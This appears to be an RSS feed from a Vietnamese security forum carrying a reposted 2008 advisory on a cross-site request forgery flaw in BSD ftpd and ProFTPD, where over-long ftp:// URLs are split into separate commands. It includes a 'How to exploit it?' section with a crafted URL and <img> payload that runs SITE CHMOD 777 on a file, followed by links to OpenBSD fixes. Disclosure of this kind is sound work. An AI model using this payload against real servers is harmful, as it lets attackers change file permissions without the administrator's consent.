@@ -1,0 +1,111 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "ProFTPD bị Cross-site request forger"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "ProFTPD bị Cross-site request forger"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>ProFTPD bị Cross-site request forger</title>
+				<description><![CDATA[ <font color='red'>Maksymilian Arciemowicz</font> of <b>securityreason.com</b> reported the following:
+
+ftpd -- Internet File Transfer Protocol server
+
+The ftpd utility is the Internet File Transfer Protocol server process. The server uses the TCP protocol and listens at the port specified with the -P option or in the ``ftp'' service specification; see services(5).
+
+Cross-site request forgery, also known as one click attack, sidejacking or session riding and abbreviated as CSRF (Sea-Surf[1]) or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user the website trusts. Contrary to cross-site scripting (XSS), which exploits the trust a user has for a particular site, cross-site request forgery exploits the trust that a site has for a particular user.
+
+
+<b>--- 1. ftpd *BSD - Cross-site request forgery ---</b>
+The main problem exists in spliting long command for few others. <b>The problem stems from the fact the use of the loop while() and function fgets().</b>
+
+Example:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Command
+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</pre>
+		</div>
+will be split for
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>500
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA':
+command not understood.
+500'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</pre>
+		</div>
+When we try call to ftp daemon via browsers and path is longer 512&lt;, our URL will be split.
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/* FreeBSD 7.0 */<span class="link"> ftp://cxib@127.0.0.1//////////////////////////////////////////////////</span>
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+/////////////////////////////////////syst</pre>
+		</div>
+
+return result from SYST command:
+215 UNIX Type: L8 Version: BSD-199506
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/* NetBSD 4.0 */<span class="link"> ftp://ftp.netbsd.org//////////////////////////////////////////////////</span>
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+/////////////////////////////////////SYST</pre>
+		</div>
+
+return result from SYST command:
+215 UNIX Type: L8 Version: NetBSD-ftpd 20080609
+
+The situation, can be dangerous, when this bug can be exploited like any CSRF attack. Because we can use SITE CHMOD command to change file permission. Only we need some exploit and luck, that admin will executed it.
+
+<b>How to exploit it?</b>
+
+<b>0. Creating some html file with &lt;img&gt; tags</b>
+&lt;img src="ftp://.....////SITE%20CHMOD%20777%20FILENAME"&gt;
+..
+
+<b>1. Give preparing URL for admin.</b>
+
+Example:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>ftp://ftp.netbsd.org//////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+/////////////////////////////////////SITE%20CHMOD%20777%20EXAMPLEFILE</pre>
+		</div>
+
+will change permission to EXAMPLEFILE when the owner will use this URL.
+
+I think, it should be some byte, what inform about overflow (empty command should nulling this byte). We have diagnosed this issue on BSD systems. Unfortunately, we do not know exactly how many machines can be infected.
+
+
+
+<b>--- 2. How to fix ---</b>
+OpenBSD has been first informed. Fix is avalible on cvs:
+<span class="link"> http://www.openbsd.org/cgi-bin/cvsweb/src/libexec/ftpd/ftpd.c</span><span class="link"> http://www.openbsd.org/cgi-bin/cvsweb/src/libexec/ftpd/extern.h</span><span class="link"> http://www.openbsd.org/cgi-bin/cvsweb/src/libexec/ftpd/ftpcmd.y</span>
+
+Thanks for OpenBSD teams.
+
+
+Những ai đang dùng proFPTd trên *BSD, nên <b><font color='red'>patch gấp</font></b> kẻo nguy.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/25407.hva#153816</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/25407.hva#153816</link>
+				<pubDate><![CDATA[Fri, 3 Oct 2008 07:14:51]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+	</channel>
+</rss>
